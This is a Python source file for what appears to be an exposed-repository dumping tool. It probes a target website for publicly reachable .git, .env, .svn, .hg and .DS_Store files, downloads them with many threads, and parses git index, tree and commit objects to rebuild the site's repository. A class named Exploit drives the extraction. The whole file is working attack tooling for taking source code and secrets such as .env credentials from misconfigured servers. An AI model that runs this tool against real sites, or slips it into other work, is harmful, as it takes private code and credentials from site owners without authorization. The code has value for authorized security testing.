import concurrent.futures
import configparser
import os
import zlib
import struct
from os import path, makedirs, getcwd
from threading import Lock
from tqdm import tqdm
from tools.files import Internet as webFiles, Internet
from tools.logger import message
from tools.strings import git_url, url_git

class Git:
    @staticmethod
    def isObject(objname: str) -> bool:
        return "/" in objname and len(objname.split("/")[-1]) >= 38

    @staticmethod
    def process(working_dir: str, objname: str) -> list:
        # Placeholder for complex object processing if needed
        return []

    @staticmethod
    def parseObjectsAndPacks(filepath: str) -> list:
        found = []
        if not path.exists(filepath):
            return found
            
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            
            if not data: return found

            # --- CASE 1: Git Index (DIRC) ---
            if data.startswith(b"DIRC"):
                # Header: DIRC (4) + Version (4) + Entries (4)
                if len(data) < 12: return found
                num_entries = struct.unpack(">I", data[8:12])[0]
                
                # Offset starts after header (12 bytes)
                pos = 12
                for _ in range(num_entries):
                    # SHA1 is at offset 40 from entry start
                    sha1_pos = pos + 40
                    if sha1_pos + 20 > len(data): break
                    
                    sha1 = data[sha1_pos:sha1_pos+20].hex()
                    found.append(f"objects/{sha1[:2]}/{sha1[2:]}")
                    
                    # Read flags for name length (2 bytes at offset 60)
                    flags = struct.unpack(">H", data[sha1_pos+20:sha1_pos+22])[0]
                    name_len = flags & 0x0FFF
                    
                    # Entry length is 62 (header) + name_len + (1-8 bytes padding)
                    # The padding makes (62 + name_len + padding) % 8 == 0
                    entry_len = 62 + name_len
                    padding = 8 - (entry_len % 8)
                    pos += entry_len + padding
                return found

            # --- CASE 2: Zlib compressed object (loose object) ---
            if data[0] == 0x78:
                decompressed = zlib.decompress(data)
                if b"\x00" in decompressed:
                    header, body = decompressed.split(b"\x00", 1)
                    if header.startswith(b"tree"):
                        pos = 0
                        while pos < len(body):
                            space_pos = body.find(b" ", pos)
                            if space_pos == -1: break
                            null_pos = body.find(b"\x00", space_pos)
                            if null_pos == -1: break
                            sha1 = body[null_pos+1:null_pos+21]
                            if len(sha1) < 20: break
                            sha1_hex = sha1.hex()
                            found.append(f"objects/{sha1_hex[:2]}/{sha1_hex[2:]}")
                            pos = null_pos + 21
                    elif header.startswith(b"commit"):
                        # Extract tree SHA and parent SHAs from commit body
                        decoded = body.decode('utf-8', errors='ignore')
                        lines = decoded.split('\n')
                        for line in lines:
                            if line.startswith('tree ') or line.startswith('parent '):
                                sha1_hex = line.split(' ')[1].strip()
                                if len(sha1_hex) == 40:
                                    found.append(f"objects/{sha1_hex[:2]}/{sha1_hex[2:]}")
        except Exception:
            pass
        return found

class Web:
    def __init__(self):
        self.url = ""
        self.__domain = ""
        self.repository = type('obj', (object,), {'host': '', 'name': '', 'user': ''})
        self.QUEUE = []
        self.REPO_TYPE = "git" # Default, changed in probe()
        self.files = Exploit(self)

    def setDomain(self, url: str):
        from tools.strings import fixed_url
        clean_url = fixed_url(url)
        self.url = clean_url.rstrip("/") + "/"
        self.__domain = self.url
        self.repository.host = clean_url.split("//")[-1].split("/")[0]
        self.files = Exploit(self)

    def set_timeout(self, timeout: int):
        if timeout:
            webFiles.timeout = int(timeout)

    def set_concurrency(self, concurrency: int):
        if concurrency:
            self.files.set_workers(int(concurrency))

    def _getDomain(self) -> str:
        return self.__domain

    def init(self, mode: str, speed: str):
        # 1. Prepare directory and initial queue
        self.files.start_download() # This defines working dir
        
        if self.REPO_TYPE == "git":
            # Step 1: Base files
            self.download_base_files()
            
            # Step 2: Main branch from HEAD
            head_data = Internet.get(f"{self.url}.git/HEAD")
            if head_data and b"ref: " in head_data:
                ref_path = head_data.decode('utf-8').strip().split("ref: ")[1]
                self.download_ref(ref_path)

            # Step 3: Extract from common refs
            self.extract_from_refs()
            
            # Step 4: Final extraction
            self.files.start_download()

    def download_base_files(self):
        files = ["HEAD", "config", "description", "index", "packed-refs", "info/exclude", "objects/"]
        for f in files:
            self.files.download_and_process(f)

    def extract_from_refs(self):
        common_refs = [
            "refs/heads/master", "refs/heads/main", "refs/heads/dev", "refs/heads/staging",
            "refs/remotes/origin/master", "refs/remotes/origin/main", "refs/stash"
        ]
        for ref in common_refs:
            self.download_ref(ref)

    def download_ref(self, ref_path: str):
        data = Internet.get(f"{self.url}.git/{ref_path}")
        if data and len(data.strip()) == 40:
            obj_sha = data.decode('utf-8').strip()
            obj_path = f"objects/{obj_sha[:2]}/{obj_sha[2:]}"
            with self.files._Exploit__lock:
                if obj_path not in self.files._Exploit__downloaded:
                    self.files._Exploit__crawler.QUEUE.append(obj_path)

    def probe(self) -> bool:
        # Reset queue for each probe
        self.QUEUE = []
        
        # 1. Check for .git
        data = webFiles.get(f"{self.__domain}.git/HEAD")
        if Internet.is_valid_git_content(data, "HEAD"):
            self.REPO_TYPE = "git"
            self.QUEUE.extend(["HEAD", "config", "index", "description"])
            return True
            
        # 2. Check for .env
        data = webFiles.get(f"{self.__domain}.env")
        if data and not Internet.is_valid_git_content(data, "<html>"): # Reuse HTML check
            self.REPO_TYPE = "env"
            self.QUEUE.extend([".env", ".env.local", ".env.dev", ".env.prod", ".env.example"])
            return True
            
        # 3. Check for SVN
        data = webFiles.get(f"{self.__domain}.svn/wc.db")
        if Internet.is_valid_git_content(data, "wc.db"):
            self.REPO_TYPE = "svn"
            self.QUEUE.extend([".svn/wc.db", ".svn/entries", ".svn/format"])
            return True

        # 4. Check for Hg
        data = webFiles.get(f"{self.__domain}.hg/00manifest.i")
        if Internet.is_valid_git_content(data, "00manifest.i"):
            self.REPO_TYPE = "hg"
            self.QUEUE.extend([".hg/00manifest.i", ".hg/requires", ".hg/hgrc"])
            return True
            
        # 5. Check for .DS_Store
        data = webFiles.get(f"{self.__domain}.DS_Store")
        if Internet.is_valid_git_content(data, ".DS_Store"):
            self.REPO_TYPE = "ds_store"
            self.QUEUE.append(".DS_Store")
            return True

        return False

class Exploit:
    def __init__(self, crawler: Web):
        self.__crawler = crawler
        self.__workingDir = ""
        self.__downloaded = set()
        self.__parsed = set()
        self.__config = {}
        self.__lock = Lock()
        self.__max_workers = 10
        self.__pbar = None

    def set_workers(self, workers: int):
        self.__max_workers = int(workers)

    def __get_remote_url(self, objname: str, tech_override: str = None) -> str:
        base = self.__crawler._getDomain()
        tech = tech_override if tech_override else self.__crawler.REPO_TYPE
        
        if tech == "git" and not objname.startswith("."):
            return f"{base}.git/{objname}"
        return f"{base}{objname}"

    def __defineWorkingDir(self, output_dir: str = None):
        base_path = output_dir if output_dir else getcwd()
        repo_name = self.__crawler.repository.host
        repo_type = self.__crawler.REPO_TYPE
        
        folder_name = repo_name if repo_type == "git" else f"{repo_name}_{repo_type}"
        suffix = ".git" if repo_type == "git" else ""
        
        # WE NO LONGER makedirs here. Lazy creation in download_and_process.
        self.__workingDir = path.join(base_path, "repos", folder_name, suffix)

    @property
    def workingDir(self) -> str:
        return self.__workingDir

    @property
    def config(self) -> dict:
        self.load_config()
        return self.__config

    def load_config(self):
        if self.__crawler.REPO_TYPE != "git":
            return
            
        if self.__config:
            return self.__config

        data = webFiles.get(self.__get_remote_url("config"))
        if data:
            try:
                config = configparser.ConfigParser()
                config.read_string(data.decode("utf-8", errors="ignore"))
                remote_key = next((key for key in config if key.startswith("remote")), None)
                if remote_key and "url" in config[remote_key]:
                    self.__config = git_url(config[remote_key]["url"])
            except: pass
            
        if not self.__config:
            self.__config = url_git(self.__crawler._getDomain())
            
        self.__crawler.repository.name = self.__config.get("name", self.__crawler.repository.host)
        self.__crawler.repository.user = self.__config.get("user", "unknown")
        return self.__config

    def start_download(self, output_dir: str = None, position: int = 0, force_dir: str = None):
        if force_dir:
            self.__workingDir = force_dir
        else:
            self.__defineWorkingDir(output_dir)
            
        if self.__crawler.REPO_TYPE == "git":
            self.load_config()
        
        if os.path.exists(self.__workingDir):
            message.info(f"Pre-scanning local objects in {self.__workingDir}...")
            count = 0
            for r, d, f in os.walk(self.__workingDir):
                for file in f:
                    full_p = os.path.join(r, file)
                    rel_p = os.path.relpath(full_p, self.__workingDir)
                    
                    # Store what's already on disk
                    with self.__lock:
                        self.__downloaded.add(rel_p)
                    count += 1
                    
                    # If it's a git object or index, add to queue for recursive mining
                    if self.__crawler.REPO_TYPE == "git":
                        if rel_p == "index" or rel_p.startswith("objects/"):
                             with self.__lock:
                                if rel_p not in self.__parsed:
                                    self.__crawler.QUEUE.append(rel_p)
            if count > 0:
                message.info(f"Detected {count} local files. Enabling recursive Local Mining...")

        self.__stats = {"ok": 0, "err": 0}
        with self.__lock:
            initial_count = len(self.__crawler.QUEUE)
            self.__pbar = tqdm(
                total=initial_count, 
                desc=f"Mining {self.__crawler.REPO_TYPE} @ {self.__crawler.repository.host}", 
                unit="obj",
                position=position,
                leave=position == 0,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}] {postfix}"
            )
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.__max_workers) as executor:
            while True:
                with self.__lock:
                    if not self.__crawler.QUEUE: break
                    items = list(self.__crawler.QUEUE)
                    self.__crawler.QUEUE.clear()
                
                futures = [executor.submit(self.download_and_process, item) for item in items]
                concurrent.futures.wait(futures)
        
        if self.__pbar: self.__pbar.close()
        
        # Final success only if we actually downloaded something
        if len(self.__downloaded) > 0:
            message.success(f"Finished {self.__crawler.REPO_TYPE} extraction for {self.__crawler.repository.host}. Success: {self.__stats['ok']}, Failed: {self.__stats['err']}")
        else:
            message.warn(f"No valid {self.__crawler.REPO_TYPE} content recovered for {self.__crawler.repository.host}")

    def download_and_process(self, objname: str):
        with self.__lock:
            if objname in self.__parsed: return
        
        target = path.join(self.__workingDir, objname)
        data = None
        
        # Check if we already have it locally
        if os.path.exists(target):
            try:
                with open(target, "rb") as f:
                    data = f.read()
            except: pass
            
        # If not local, download from remote
        if data is None:
            remote_url = self.__get_remote_url(objname)
            data = webFiles.get(remote_url)
            if data and Internet.is_valid_git_content(data, objname) is True:
                makedirs(path.dirname(target), exist_ok=True)
                with open(target, "wb") as f:
                    f.write(data)
                with self.__lock:
                    self.__downloaded.add(objname)
                    self.__stats["ok"] += 1
            else:
                if data and Internet.is_valid_git_content(data, objname) == "DIRECTORY_LISTING":
                    found_links = Internet.scrape_index(data)
                    with self.__lock:
                        added = 0
                        for l in found_links:
                            subpath = path.join(objname, l)
                            if subpath not in self.__downloaded:
                                self.__crawler.QUEUE.append(subpath)
                                added += 1
                        if self.__pbar and added > 0:
                            self.__pbar.total += added
                else:
                    with self.__lock:
                        self.__stats["err"] += 1
                return

        # At this point, we have data (either local or just downloaded)
        # Now we MINE it recursively
        with self.__lock:
            self.__parsed.add(objname)
            
        if self.__crawler.REPO_TYPE == "git":
            found = []
            if Git.isObject(objname):
                found.extend(Git.process(self.__workingDir, objname))
            found.extend(Git.parseObjectsAndPacks(target))
            
            if found:
                with self.__lock:
                    added = 0
                    for o in found:
                        if o not in self.__parsed: # Check parsed, not downloaded
                            self.__crawler.QUEUE.append(o)
                            added += 1
                    if self.__pbar and added > 0:
                        self.__pbar.total += added

        if self.__pbar:
            with self.__lock: 
                self.__pbar.set_postfix(OK=self.__stats["ok"], Err=self.__stats["err"])
                self.__pbar.update(1)

        if self.__pbar:
            with self.__lock: 
                self.__pbar.set_postfix(OK=self.__stats["ok"], Err=self.__stats["err"])
                self.__pbar.update(1)
